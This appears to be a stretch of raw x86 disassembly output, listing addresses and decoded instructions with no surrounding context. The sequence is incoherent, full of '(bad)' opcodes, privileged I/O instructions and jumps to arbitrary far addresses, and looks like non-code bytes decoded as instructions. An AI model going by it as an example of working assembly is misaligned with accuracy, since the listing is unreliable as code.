  42db69:	xor    al,0x61
  42db6b:	or     edi,eax
  42db6d:	xchg   BYTE PTR [edx+0x22af1b90],cl
  42db73:	push   eax
  42db74:	daa    
  42db75:	loop   0x42dbb3
  42db77:	stc    
  42db78:	lods   al,BYTE PTR ds:[esi]
  42db79:	pop    eax
  42db7a:	out    0xc3,al
  42db7c:	or     dh,0x56
  42db7f:	mov    ds,WORD PTR [ebp+eiz*2+0x3ac475da]
  42db86:	sbb    al,0x34
  42db88:	or     al,bl
  42db8a:	sub    dh,dl
  42db8c:	ret    0xf3ab
  42db8f:	ins    DWORD PTR es:[edi],dx
  42db90:	xchg   esi,eax
  42db91:	cmc    
  42db92:	ret    
  42db93:	sbb    esi,DWORD PTR ds:0xcf92c64c
  42db99:	jns    0x42dc19
  42db9b:	sar    BYTE PTR [eax-0x56],0x1e
  42db9f:	mov    ds:0xa53cc2ed,eax
  42dba4:	and    ebx,edx
  42dba6:	paddw  mm1,mm7
  42dba9:	call   0xfad62893
  42dbae:	ror    BYTE PTR [edi-0xab86d5],1
  42dbb4:	test   cl,dh
  42dbb6:	jbe    0x42db67
  42dbb8:	pop    edi
  42dbb9:	repnz sub eax,edx
  42dbbc:	xor    BYTE PTR [eax],dl
  42dbbe:	cmp    edx,eax
  42dbc0:	push   ecx
  42dbc1:	xor    al,al
  42dbc3:	(bad)  
  42dbc4:	loopne 0x42dbcb
  42dbc6:	xor    esp,DWORD PTR [ebx+0x2f]
  42dbc9:	push   cs
  42dbca:	cmp    WORD PTR [ebx+0x1b4dd747],bp
  42dbd1:	push   esp
  42dbd2:	jmp    0x7601:0x584d8d4
  42dbd9:	pushf  
  42dbda:	lods   eax,DWORD PTR ds:[esi]
  42dbdb:	inc    esp
  42dbdc:	push   edx
  42dbdd:	je     0x42dc45
  42dbdf:	sub    esp,DWORD PTR ds:[edx+ecx*8]
  42dbe3:	mov    bh,0x45
  42dbe5:	mov    esi,0x805571ee
  42dbea:	aas    
  42dbeb:	lahf   
  42dbec:	jge    0x42dbbe
  42dbee:	nop
  42dbef:	(bad)  
  42dbf0:	hlt    
  42dbf1:	clc    
  42dbf2:	test   eax,0x1f1e9e65
  42dbf7:	fbstp  TBYTE PTR [eax+edi*8-0x4043a6d]
  42dbfe:	sbb    edi,esi
  42dc00:	addr16 jl 0x42dc76
  42dc03:	dec    esi
  42dc04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc05:	dec    eax
  42dc06:	mov    dh,0x83
  42dc08:	push   edi
  42dc09:	neg    DWORD PTR [ecx-0x73658755]
  42dc0f:	arpl   WORD PTR [ebx],di
  42dc11:	out    dx,al
  42dc12:	(bad)  
  42dc13:	cmp    al,ah
  42dc15:	(bad)  
  42dc16:	(bad)  
  42dc18:	sbb    esp,ecx
  42dc1a:	test   cl,0x38
  42dc1d:	ss (bad) 
  42dc1f:	and    dl,BYTE PTR [esi+0x6fa03756]
  42dc25:	mov    ah,0x84
  42dc27:	loopne 0x42dca5
  42dc29:	mov    edx,0xa5de9d08
  42dc2e:	mov    bh,0x86
  42dc30:	mov    ah,ah
  42dc32:	rcr    BYTE PTR [edi],0x2e
  42dc35:	sbb    BYTE PTR [ebx],cl
  42dc37:	sbb    al,0x99
  42dc39:	push   ds
  42dc3a:	ins    BYTE PTR es:[edi],dx
  42dc3b:	add    ecx,esi
  42dc3d:	adc    al,0x9c
  42dc3f:	fsub   DWORD PTR [edi+0x4a54ad81]
  42dc45:	mov    eax,0xedbcb1dc
  42dc4a:	shl    DWORD PTR [edx-0x597bf215],0x7d
  42dc51:	or     BYTE PTR [ebp+ebx*2+0x9],al
  42dc55:	push   es
  42dc56:	and    edi,DWORD PTR [ecx-0x17b47cdb]
  42dc5c:	and    ebx,DWORD PTR [esp+ebx*4-0x3e1ce342]
  42dc63:	lea    ebp,[edi-0x32]
  42dc66:	sub    al,0x17
  42dc68:	lock adc dl,BYTE PTR [esp+ebx*4-0x5e]
  42dc6d:	lock xlat BYTE PTR ds:[ebx]
  42dc6f:	loopne 0x42dc03
  42dc71:	adc    ebx,edi
  42dc73:	mov    dl,0x2f
  42dc75:	xor    eax,DWORD PTR [ebp+0x41122912]
  42dc7b:	repnz mov ebp,0x84439ec2
  42dc81:	jmp    0x98bab883
  42dc86:	call   0x7c4:0x29bbdf1d
  42dc8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc8e:	lahf   
  42dc8f:	mov    eax,ds:0xe247ce81
  42dc94:	and    eax,0x7fbd744c
  42dc99:	inc    esp
  42dc9a:	mov    ss,edx
  42dc9c:	or     eax,0xbf1baf53
  42dca1:	ficom  WORD PTR [edx-0x11]
  42dca4:	rcl    BYTE PTR [esi],1
  42dca6:	cwde   
  42dca7:	pushf  
  42dca8:	jnp    0x42dc84
  42dcaa:	cmp    BYTE PTR [eax-0x73b4e74f],ah
  42dcb0:	stc    
  42dcb1:	cld    
  42dcb2:	adc    ch,0x18
  42dcb5:	adc    dh,BYTE PTR [eax-0x5e]
  42dcb8:	fimul  DWORD PTR [ebx+edx*4]
  42dcbb:	add    eax,DWORD PTR [esi-0x6]
  42dcbe:	xchg   esi,eax
  42dcbf:	dec    edi
  42dcc0:	push   ss
  42dcc1:	and    dl,dh
  42dcc3:	push   esi
  42dcc4:	jbe    0x42dd01
  42dcc6:	sar    DWORD PTR [edx],0xbd
  42dcc9:	out    0x1b,al
  42dccb:	push   edi
  42dccc:	jbe    0x42dd06
  42dcce:	in     al,0x29
  42dcd0:	push   esi
  42dcd1:	test   ch,dh
  42dcd3:	loope  0x42dd1d
  42dcd5:	mov    eax,0xc6ac2aec
  42dcda:	ja     0x42dcf2
  42dcdc:	(bad)  
  42dcdd:	(bad)  
  42dcde:	leave  
  42dcdf:	jbe    0x42dd1f
  42dce1:	jo     0x42dd20
  42dce3:	xor    eax,0xf3d102c3
  42dce8:	sub    eax,0x2f9ca248
  42dced:	sbb    ebp,ebx
  42dcef:	sub    BYTE PTR [edi+0x281a0dd3],al
  42dcf5:	mov    esi,0xdd4ef2db
  42dcfa:	fisubr WORD PTR [eax-0x6c6b4930]
  42dd00:	or     al,0xe3
  42dd02:	mov    ah,0x66
  42dd04:	ins    BYTE PTR es:[edi],dx
  42dd05:	dec    ecx
  42dd06:	pop    es
  42dd07:	popf   
  42dd08:	mov    WORD PTR [edi+ecx*4],?
  42dd0b:	(bad)  
  42dd0c:	retf   0x358c
  42dd0f:	hlt    
  42dd10:	stos   BYTE PTR es:[edi],al
  42dd11:	jmp    0xb04dbedf
  42dd16:	push   esp
  42dd17:	adc    al,bh
  42dd19:	call   0x6e2c:0xd26af833
  42dd20:	lods   al,BYTE PTR ds:[esi]
  42dd21:	inc    ebx
  42dd22:	push   edx
  42dd23:	scas   al,BYTE PTR es:[edi]
  42dd24:	mov    dl,bh
  42dd26:	dec    ecx
  42dd27:	cmp    ecx,DWORD PTR [edx+0x605c3382]
  42dd2d:	xchg   DWORD PTR [ecx-0x74],esi
  42dd30:	cmp    ch,BYTE PTR [edi-0x591b4ad8]
  42dd36:	pop    DWORD PTR [ebx]
  42dd38:	(bad)  
  42dd3a:	inc    ebx
  42dd3b:	xor    cl,BYTE PTR [edi+0x3eeba77]
  42dd41:	ror    BYTE PTR [ecx+0x2caa7e9f],cl
  42dd47:	add    dl,BYTE PTR [ecx-0x7caf575f]
  42dd4d:	mov    al,ds:0x62166812
  42dd52:	in     eax,0xa
  42dd54:	or     ch,bh
  42dd56:	into   
  42dd57:	mov    edx,0x43aca6b1
  42dd5c:	jb     0x42dd7e
  42dd5e:	ror    bl,cl
  42dd60:	in     eax,dx
  42dd61:	lods   ax,WORD PTR ds:[esi]
  42dd63:	sbb    DWORD PTR [edx+0xf8ad031],esp
  42dd69:	repnz imul esi,DWORD PTR [ebx],0xffffffcc
  42dd6d:	and    eax,0xf19b07bd
  42dd72:	pop    edi
  42dd73:	les    edx,FWORD PTR [esi+0x2c]
  42dd76:	das    
  42dd77:	xchg   ecx,eax
  42dd78:	xlat   BYTE PTR ds:[ebx]
  42dd79:	cmc    
  42dd7a:	fnclex 
  42dd7c:	mov    eax,0x5d314ab9
  42dd81:	dec    eax
  42dd82:	inc    ecx
  42dd83:	lahf   
  42dd84:	retf   0xece0
  42dd87:	jg     0x42ddac
  42dd89:	add    BYTE PTR [ebp+0x7f],cl
  42dd8c:	pop    ebx
  42dd8d:	push   esi
  42dd8e:	lock pop edi
  42dd90:	jecxz  0x42dd7d
  42dd92:	out    dx,al
  42dd93:	mov    ebp,0xed98c5e5
  42dd98:	mov    ds:0xac2a567e,al
  42dd9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd9e:	sub    cl,BYTE PTR [eax+0x1595f5ee]
  42dda4:	enter  0x4a57,0xd2
  42dda8:	stc    
  42dda9:	lock cmc 
  42ddab:	scas   eax,DWORD PTR es:[edi]
  42ddac:	sub    ebx,esi
  42ddae:	fst    QWORD PTR [ebp+0x7f272a0c]
  42ddb4:	inc    edx
  42ddb5:	scas   eax,DWORD PTR es:[edi]
  42ddb6:	xor    ebp,ecx
  42ddb8:	jecxz  0x42dda4
  42ddba:	push   0xdce8b4dc
  42ddbf:	neg    DWORD PTR [edi]
  42ddc1:	fld    DWORD PTR [ebx+0x3d]
  42ddc4:	in     eax,dx
  42ddc5:	repz xor edx,edi
  42ddc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddc9:	cld    
  42ddca:	push   0xffffff8e
  42ddcc:	dec    ebx
  42ddcd:	lds    bp,DWORD PTR [edx-0x12]
  42ddd1:	aad    0x7b
  42ddd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ddd4:	cmp    al,0xd1
  42ddd6:	jnp    0x42de14
  42ddd8:	ds pusha 
  42ddda:	inc    ebp
  42dddb:	lahf   
  42dddc:	jp     0x42de0d
  42ddde:	(bad)  
  42dddf:	jmp    0x42de20
  42dde1:	stos   BYTE PTR es:[edi],al
  42dde2:	icebp  
  42dde3:	or     DWORD PTR [ebx+0x477cc906],eax
  42dde9:	das    
  42ddea:	retf   
  42ddeb:	sbb    dh,BYTE PTR [ecx-0x28]
  42ddee:	adc    dh,BYTE PTR [ebx]
  42ddf0:	sub    eax,eax
  42ddf2:	cmc    
  42ddf3:	push   edi
  42ddf4:	std    
  42ddf5:	or     al,cl
  42ddf7:	sub    ebx,DWORD PTR [esi]
  42ddf9:	rcr    ch,cl
  42ddfb:	sbb    dl,0xfb
  42ddfe:	xchg   esp,eax
  42ddff:	and    bl,BYTE PTR [ebp+0x6f0bbf0b]
  42de05:	sub    bl,BYTE PTR [ebx]
  42de07:	mov    ds:0xab05b59a,eax
  42de0c:	outs   dx,DWORD PTR ds:[esi]
  42de0d:	sub    dh,BYTE PTR ds:0xddbc0d2
  42de13:	test   ebp,eax
  42de15:	mov    DWORD PTR [ebp+0x7b640a77],eax
  42de1b:	adc    DWORD PTR [ecx],0x3a017b20
  42de21:	xchg   ebp,eax
  42de22:	pop    eax
  42de23:	ror    DWORD PTR ds:0x6943b14a,cl
  42de29:	sub    BYTE PTR [esi-0x7cc23177],ah
  42de2f:	xchg   edx,eax
  42de30:	mov    bh,0x92
  42de32:	and    DWORD PTR [ebp+edx*1-0x5f5661cb],edx
  42de39:	sub    al,0xb5
  42de3b:	aam    0x29
  42de3d:	les    eax,FWORD PTR [edx]
  42de3f:	outs   dx,DWORD PTR ds:[esi]
  42de40:	clc    
  42de41:	pop    esi
  42de42:	or     al,0xfd
  42de44:	data16 pushw cs
  42de47:	pop    edi
  42de48:	xor    BYTE PTR [ebx+0x15087fd0],ch
  42de4e:	xor    esp,DWORD PTR [edx+0x6c]
  42de51:	push   0x6598b146
  42de56:	mov    ch,0x74
  42de58:	es mov ebp,cr6
  42de5c:	rdtsc  
  42de5e:	dec    edi
  42de5f:	ins    DWORD PTR es:[edi],dx
  42de60:	sub    eax,0x56d25d16
  42de65:	int    0x1e
  42de67:	jnp    0x42de63
  42de69:	mov    al,0x13
  42de6b:	sub    DWORD PTR [edi-0x7],ebp
  42de6e:	xchg   ebp,eax
  42de6f:	cmp    ch,al
  42de71:	loope  0x42de34
  42de73:	int3   
  42de74:	sbb    ah,BYTE PTR [eax+0x478a0a12]
  42de7a:	and    ebp,ebp
  42de7c:	js     0x42de09
  42de7e:	sar    BYTE PTR [edi+0x34],1
  42de81:	int3   
  42de82:	and    al,0xa9
  42de84:	dec    edx
  42de85:	add    edi,DWORD PTR [eax]
  42de87:	sub    al,0xbb
  42de89:	lds    ebx,FWORD PTR [ebx-0x748c98a7]
  42de8f:	dec    ebx
  42de90:	loop   0x42de35
  42de92:	mov    DWORD PTR [edx-0x47],ebp
  42de95:	aas    
  42de96:	scas   al,BYTE PTR es:[edi]
  42de97:	mov    ah,0xf8
  42de99:	and    dl,BYTE PTR [ebp-0x55ba38ef]
  42de9f:	inc    eax
  42dea0:	sub    esp,DWORD PTR [edi-0x4f0e2963]
  42dea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dea7:	arpl   cx,bx
  42dea9:	mov    ebp,0x171f532d
  42deae:	pop    esi
  42deaf:	ret    0xfacc
  42deb2:	(bad)  
  42deb3:	sbb    dh,BYTE PTR [edx+ecx*2+0x49]
  42deb7:	or     al,0x81
  42deb9:	sbb    edx,DWORD PTR [edx+ebx*8]
  42debc:	add    edi,0x1a
  42debf:	loop   0x42de56
  42dec1:	sub    eax,0x439f64b
  42dec6:	ins    DWORD PTR es:[edi],dx
  42dec7:	xchg   DWORD PTR [ecx],ecx
  42dec9:	sbb    BYTE PTR [edi-0x14],al
  42decc:	ror    DWORD PTR [ebx+0x2f30abcb],1
  42ded2:	dec    edx
  42ded3:	imul   ebp,esi,0x5af8e99a
  42ded9:	xchg   DWORD PTR [ebx+eax*8],eax
  42dedc:	retf   0xb092
  42dedf:	jns    0x42def3
  42dee1:	xchg   DWORD PTR [esp+ecx*2],ecx
  42dee4:	cld    
  42dee5:	loopne 0x42df63
  42dee7:	out    0x34,al
  42dee9:	push   edx
  42deea:	mov    dh,dl
  42deec:	mov    WORD PTR [ebx-0x6f0b9d07],?
  42def2:	xchg   esp,eax
  42def3:	ss sbb bl,bl
  42def6:	mul    BYTE PTR [ecx+0x2c]
  42def9:	rcl    BYTE PTR [edx+0x5fd54e0],1
  42deff:	jmp    0x42df24
  42df01:	push   edx
  42df02:	rcl    DWORD PTR [esi+eax*2],1
  42df05:	cdq    
  42df06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df07:	adc    DWORD PTR [ebx-0x7e],ebp
  42df0a:	popf   
  42df0b:	inc    ebx
  42df0c:	ret    
  42df0d:	test   eax,0x7dab971d
  42df12:	jo     0x42df3c
  42df14:	dec    eax
  42df15:	xchg   edi,eax
  42df16:	mov    al,0x2f
  42df18:	out    0x79,al
  42df1a:	retf   
  42df1b:	lahf   
  42df1c:	ror    eax,0x31
  42df1f:	dec    ecx
  42df20:	mov    ah,0x37
  42df22:	inc    ebx
  42df23:	mov    bl,0x7e
  42df25:	es sbb al,0x50
  42df28:	int3   
  42df29:	cmp    BYTE PTR [edi],dh
  42df2b:	out    0x44,al
  42df2d:	mov    edx,0x4e6ac950
  42df32:	imul   edi,DWORD PTR [ebp-0x2e757ef9],0x7f
  42df39:	mov    ah,0x67
  42df3b:	xchg   esp,eax
  42df3c:	test   DWORD PTR [ebp-0x20],edx
  42df3f:	sub    eax,0x65735820
  42df44:	pop    esp
  42df45:	test   DWORD PTR [ecx+eax*4],edx
  42df48:	les    edx,FWORD PTR [edx-0x58]
  42df4b:	jg     0xef936649
  42df51:	popa   
  42df52:	jbe    0x42df70
  42df54:	pop    edx
  42df55:	sti    
  42df56:	mov    ds:0x767ea38,al
  42df5b:	add    DWORD PTR [esi-0x331b5880],edi
  42df61:	(bad)  
  42df62:	mov    ss,WORD PTR [esi]
  42df64:	mov    bl,0x9d
  42df66:	cwde   
  42df67:	test   al,cl
  42df69:	dec    ebp
  42df6a:	mov    eax,ds:0x96e8d774
  42df6f:	jae    0x42df6d
  42df71:	pusha  
  42df72:	(bad)  
  42df73:	int    0xcb
  42df75:	loop   0x42df27
  42df77:	mov    ecx,0x2fe5617f
  42df7c:	aaa    
  42df7d:	sbb    DWORD PTR [ebx+0x525e5691],ebx
  42df83:	inc    ebx
  42df84:	inc    eax
  42df85:	out    0x8e,al
  42df87:	int    0xe1
  42df89:	dec    ecx
  42df8a:	in     eax,dx
  42df8b:	pop    ds
  42df8c:	and    ebp,esp
  42df8e:	mov    ah,0x1c
  42df90:	jae    0x42df51
  42df92:	clc    
  42df93:	bound  edx,QWORD PTR [edi]
  42df95:	out    dx,eax
  42df96:	in     al,dx
  42df97:	push   ecx
  42df98:	mov    DWORD PTR [ecx+0x71],edi
  42df9b:	hlt    
  42df9c:	stc    
  42df9d:	xchg   ecx,eax
  42df9e:	add    al,0xd1
  42dfa0:	jecxz  0x42df66
  42dfa2:	mov    ecx,0x17af3f19
  42dfa7:	mov    esp,0x41a17963
  42dfac:	pop    ecx
  42dfad:	dec    esi
  42dfae:	popa   
  42dfaf:	shl    DWORD PTR [ebx+0xc],cl
  42dfb2:	xchg   edi,eax
  42dfb3:	inc    ecx
  42dfb4:	pop    ebx
  42dfb5:	jmp    0x42e01e
  42dfb7:	pushf  
  42dfb8:	jns    0x42dfa6
  42dfba:	popa   
  42dfbb:	shl    DWORD PTR [eax-0x10c00eb8],cl
  42dfc1:	stos   DWORD PTR es:[edi],eax
  42dfc2:	jl     0x42dff0
  42dfc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfc5:	loope  0x42dff6
  42dfc7:	(bad)  
  42dfc8:	xor    BYTE PTR [edx+0x11],ch
  42dfcb:	scas   al,BYTE PTR es:[edi]
  42dfcc:	icebp  
  42dfcd:	je     0x42dfec
  42dfcf:	div    ch
  42dfd1:	jmp    0xe9566c27
  42dfd6:	push   ds
  42dfd7:	leave  
  42dfd8:	popw   es
  42dfda:	mov    ebx,0xcd2bac5b
  42dfdf:	out    dx,al
  42dfe0:	lea    edx,[esi-0xbbaad48]
  42dfe6:	mov    esi,0xd47adec0
  42dfeb:	sahf   
  42dfec:	shl    DWORD PTR [ebx+edi*8+0x33290347],1
  42dff3:	mov    bl,ch
  42dff5:	dec    edx
  42dff6:	js     0x42e024
  42dff8:	xchg   ebx,eax
  42dff9:	ja     0x42df98
  42dffb:	jp     0x42e041
  42dffd:	pop    es
  42dffe:	bound  ebp,QWORD PTR [eax+ecx*2-0x5e]
  42e002:	jb     0x42e01c
  42e004:	pop    ebx
  42e005:	out    dx,al
  42e006:	imul   ebp,DWORD PTR [ebp+0xd],0x8c62e3e7
  42e00d:	loope  0x42e049
  42e00f:	jno    0x42e024
  42e011:	xlat   BYTE PTR ds:[ebx]
  42e012:	les    esi,FWORD PTR [edx+0x27670259]
  42e018:	call   0x6a7a:0x6ef4644
  42e01f:	into   
  42e020:	push   0x7ff9e04a
  42e025:	pop    ebp
  42e026:	cdq    
  42e027:	jo     0x42e056
  42e029:	and    eax,0x83f7b874
  42e02e:	iret   
  42e02f:	dec    edi
  42e030:	or     BYTE PTR [ecx+edx*2+0x3d],dh
  42e034:	call   0x251ca142
  42e039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e03a:	pop    ds
  42e03b:	repz inc edi
  42e03d:	mov    dh,0xa0
  42e03f:	dec    ebp
  42e040:	clc    
  42e041:	or     dl,BYTE PTR [ecx]
  42e043:	jne    0x42e082
  42e045:	xchg   edi,eax
  42e046:	jbe    0x42e010
  42e048:	imul   esi,DWORD PTR [edi],0xffffffc3
  42e04b:	and    bl,BYTE PTR [ecx-0x4a]
  42e04e:	popa   
  42e04f:	gs clc 
  42e051:	inc    esi
  42e052:	sub    al,0xea
  42e054:	mov    ch,0xf3
  42e056:	adc    cl,BYTE PTR [ecx-0x2dc2c186]
  42e05c:	sti    
  42e05d:	adc    DWORD PTR [ebp+0x6311f72],edi
  42e063:	mov    ds:0xe2156a61,eax
  42e068:	sbb    bh,bl
  42e06a:	push   edx
  42e06b:	push   cs
  42e06c:	jg     0x42e053
  42e06e:	pcmpgtb mm4,QWORD PTR [eax+0x72]
  42e072:	loop   0x42e058
  42e074:	mov    DWORD PTR ds:0x432ea01c,esi
  42e07a:	cs sbb eax,0x76bb5b8b
  42e080:	jmp    0xd409c6bd
  42e085:	dec    ecx
  42e086:	adc    bh,BYTE PTR [ebx+esi*1]
  42e089:	inc    ebp
  42e08a:	jno    0x42e0cd
  42e08c:	fimul  DWORD PTR [edx+eax*1-0x1f]
  42e090:	ds mov esp,0x6b657f82
  42e096:	lock nop
  42e098:	and    bl,bh
  42e09a:	imul   ebp,DWORD PTR [ebp-0x4c],0xa836a726
  42e0a1:	test   cl,dl
  42e0a3:	mov    al,ds:0xc396e21e
  42e0a8:	neg    ebp
  42e0aa:	test   al,0x40
  42e0ac:	mov    ds:0x71dcb7d0,al
  42e0b1:	jns    0x42e0af
  42e0b3:	dec    ebp
  42e0b4:	or     ebp,DWORD PTR [edi]
  42e0b6:	nop
  42e0b7:	mov    eax,0xf53fdbef
  42e0bc:	popa   
  42e0bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0be:	cmp    cl,BYTE PTR [esi-0x37]
  42e0c1:	jl     0x42e0a2
  42e0c3:	inc    ebx
  42e0c4:	ror    DWORD PTR [esi+ebp*1-0x502cb8a3],1
  42e0cb:	outs   dx,BYTE PTR ds:[esi]
  42e0cc:	mov    esp,edx
  42e0ce:	scas   al,BYTE PTR es:[edi]
  42e0cf:	cdq    
  42e0d0:	dec    ebx
  42e0d1:	test   BYTE PTR [edx-0x59],bh
  42e0d4:	(bad)  
  42e0d5:	jg     0x42e0bf
  42e0d7:	xlat   BYTE PTR gs:[ebx]
  42e0d9:	pop    eax
  42e0da:	test   eax,0x6a9a3e1
  42e0df:	push   esp
  42e0e0:	ret    
  42e0e1:	jl     0x42e0f6
  42e0e3:	outs   dx,DWORD PTR ds:[esi]
  42e0e4:	add    ecx,edi
  42e0e6:	call   0x95f5:0xe8ca4f09
  42e0ed:	mov    edx,DWORD PTR [eax-0x27]
  42e0f0:	jmp    0xca8b:0xe3650051
  42e0f7:	out    dx,eax
  42e0f8:	xor    BYTE PTR [ebx+0x40],bl
  42e0fb:	iret   
  42e0fc:	pop    ebx
  42e0fd:	pushf  
  42e0fe:	push   ecx
  42e0ff:	sahf   
  42e100:	jmp    0xab8:0x1fdf5b44
  42e107:	mov    edx,0xd00b970c
  42e10c:	push   ebx
  42e10d:	ins    DWORD PTR es:[edi],dx
  42e10e:	ss sub al,0x5
  42e111:	repnz les ecx,FWORD PTR [edi]
  42e114:	outs   dx,DWORD PTR ds:[esi]
  42e115:	(bad)  
  42e116:	jb     0x42e098
  42e118:	adc    cl,ah
  42e11a:	gs int 0xdf
  42e11d:	jl     0x42e0da
  42e11f:	loopne 0x42e0c1
  42e121:	cmp    BYTE PTR [esi-0x51],ch
  42e124:	and    ch,bh
  42e126:	(bad)  
  42e127:	clc    
  42e128:	xchg   esp,eax
  42e129:	ret    
  42e12a:	sbb    BYTE PTR [edi],bh
  42e12c:	mov    DWORD PTR [ebp+0x2d],eax
  42e12f:	lock hlt 
  42e131:	mov    esp,DWORD PTR [edx]
  42e133:	pop    esp
  42e134:	push   ds
  42e135:	adc    al,0xc6
  42e137:	lds    eax,FWORD PTR [ecx+0x279d0e11]
  42e13d:	shl    DWORD PTR [edx+0x5b],1
  42e140:	xor    al,0x6d
  42e142:	sbb    al,0x19
  42e144:	(bad)  
  42e147:	scas   al,BYTE PTR es:[edi]
  42e148:	xchg   edi,eax
  42e149:	xor    al,0xdc
  42e14b:	std    
  42e14c:	inc    edi
  42e14d:	sbb    ebx,DWORD PTR [esi-0x6d8ec3bb]
  42e153:	imul   ebx,DWORD PTR [ebp-0xa0e7259],0x46
  42e15a:	das    
  42e15b:	xchg   ecx,eax
  42e15d:	sub    al,BYTE PTR [ebx-0x5ed28275]
  42e163:	out    0xbe,al
  42e165:	mov    dh,ah
  42e167:	sub    bl,al
  42e169:	cmp    BYTE PTR [ecx+0x2b0df568],ah
  42e16f:	dec    ecx
  42e170:	stos   BYTE PTR es:[edi],al
  42e171:	push   cs
  42e172:	ret    
  42e173:	daa    
  42e174:	lock lock sbb BYTE PTR [ecx-0x6f],ah
  42e179:	cli    
  42e17a:	xchg   ebx,eax
  42e17b:	push   cs
  42e17c:	gs mov dl,0x3f
  42e17f:	inc    edx
  42e180:	ror    BYTE PTR [esp+0x4d],0x89
  42e185:	and    ch,BYTE PTR [ecx]
  42e187:	mov    al,0x64
  42e189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e18a:	das    
  42e18b:	push   edx
  42e18c:	push   eax
  42e18d:	stos   DWORD PTR es:[edi],eax
  42e18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e18f:	cmp    eax,0xd73776eb
  42e194:	jae    0x42e20f
  42e196:	ror    DWORD PTR [ebx-0x2858f7de],1
  42e19c:	es inc esi
  42e19e:	mov    dh,0x0
  42e1a0:	inc    ebp
  42e1a1:	and    BYTE PTR [eax+0x3b437875],dh
  42e1a7:	xchg   esp,eax
  42e1a8:	loopne 0x42e136
  42e1aa:	pop    eax
  42e1ab:	xchg   edx,eax
  42e1ac:	xchg   edx,eax
  42e1ad:	add    BYTE PTR [ebp-0x49],0x1
  42e1b1:	bound  eax,QWORD PTR [eax-0x788ed661]
  42e1b7:	push   0x96f6bdd7
  42e1bc:	adc    esp,eax
  42e1be:	pop    eax
  42e1bf:	push   eax
  42e1c0:	pop    edi
  42e1c1:	bound  eax,QWORD PTR [edx+edx*4-0x55f0afcd]
  42e1c8:	outs   dx,BYTE PTR ds:[esi]
  42e1c9:	les    ebx,FWORD PTR [ecx-0x31]
  42e1cc:	sub    DWORD PTR [eax-0x5d46aed6],ebx
  42e1d2:	scas   al,BYTE PTR es:[edi]
  42e1d3:	pop    ebp
  42e1d4:	aad    0xfe
  42e1d6:	mov    al,0xad
  42e1d8:	(bad)  
  42e1d9:	sbb    DWORD PTR [ebx+ecx*4+0x67],eax
  42e1dd:	fisubr DWORD PTR ds:0x2c1f179
  42e1e3:	sti    
  42e1e4:	jae    0x42e238
  42e1e6:	fistp  WORD PTR [edi+edi*1]
  42e1e9:	dec    esp
  42e1ea:	dec    ebx
  42e1eb:	inc    ecx
  42e1ec:	test   eax,0xbf2ade44
  42e1f1:	aas    
  42e1f2:	mov    ecx,DWORD PTR [ebx-0x63]
  42e1f5:	mov    ds:0x4a667017,eax
  42e1fa:	shl    BYTE PTR [ebx-0x7057d18b],1
  42e200:	out    0xc5,al
  42e202:	loop   0x42e25b
  42e204:	ret    0x59e2
  42e207:	lds    esi,FWORD PTR [ebx+0x6f]
  42e20a:	icebp  
  42e20b:	add    al,0x2f
  42e20d:	popf   
  42e20e:	jb     0x42e261
  42e210:	mov    al,ds:0x5a1fcd5b
  42e215:	pop    esi
  42e216:	and    DWORD PTR [esi],ebp
  42e218:	xchg   ebx,eax
  42e219:	sbb    al,0xc7
  42e21b:	stos   BYTE PTR es:[edi],al
  42e21c:	gs push ebx
  42e21e:	cmp    BYTE PTR [ecx],al
  42e220:	mov    esp,0x8b48eef1
  42e225:	pop    es
  42e226:	and    eax,0x1d102bf
  42e22b:	das    
  42e22c:	scas   al,BYTE PTR es:[edi]
  42e22d:	cli    
  42e22e:	aam    0x7c
  42e230:	sbb    edi,esp
  42e232:	add    edx,DWORD PTR [edx*2+0x3989c4c]
  42e239:	push   es
  42e23a:	jbe    0x42e29a
  42e23c:	mov    DWORD PTR [ecx+0x7e6cf86c],ebp
  42e242:	fnstsw WORD PTR [ebx]
  42e244:	(bad)  
  42e245:	outs   dx,DWORD PTR ds:[esi]
  42e246:	cmp    ebp,ebp
  42e248:	xchg   esp,eax
  42e249:	adc    bh,BYTE PTR [eax]
  42e24b:	inc    edi
  42e24c:	mov    cl,0xf
  42e24e:	push   edi
  42e24f:	pop    esp
  42e250:	push   edx
  42e251:	jmp    0x112b:0xd17a888d
  42e258:	mov    esp,0x7f5baef5
  42e25d:	je     0x42e2cd
  42e25f:	(bad)  
  42e261:	scas   al,BYTE PTR es:[edi]
  42e262:	sbb    edx,edi
  42e264:	ins    DWORD PTR es:[edi],dx
  42e265:	mov    esi,esp
  42e267:	xchg   edi,ebx
  42e269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e26a:	lea    edi,[ebp-0x1c]
  42e26d:	imul   esp,DWORD PTR [ebx+esi*2-0x43],0xffffffa5
  42e272:	lods   eax,DWORD PTR ds:[esi]
  42e273:	or     al,0xb4
  42e275:	clc    
  42e276:	adc    ebx,ebp
  42e278:	pusha  
  42e279:	mov    eax,ds:0x6bdca14b
  42e27e:	or     ebx,DWORD PTR [ebp+0x79]
  42e281:	outs   dx,BYTE PTR ds:[esi]
  42e282:	inc    esp
  42e283:	inc    esi
  42e284:	sbb    DWORD PTR [edi+0x757f291],eax
  42e28a:	sti    
  42e28b:	cdq    
  42e28c:	or     al,0x12
  42e28e:	loop   0x42e23d
  42e290:	push   eax
  42e291:	xchg   esi,eax
  42e292:	mov    ?,WORD PTR [edx+0x79]
  42e295:	add    BYTE PTR [ecx+0x54],cl
  42e298:	iret   
  42e299:	adc    BYTE PTR [ebp+0x6a],dh
  42e29c:	in     eax,dx
  42e29d:	cmp    al,0xde
  42e29f:	push   0xffffff81
  42e2a1:	inc    esp
  42e2a2:	fst    QWORD PTR ds:0xeb061728
  42e2a8:	test   BYTE PTR [ecx+0x66],0x99
  42e2ac:	mov    ds,WORD PTR [edi+0x204be035]
  42e2b2:	aaa    
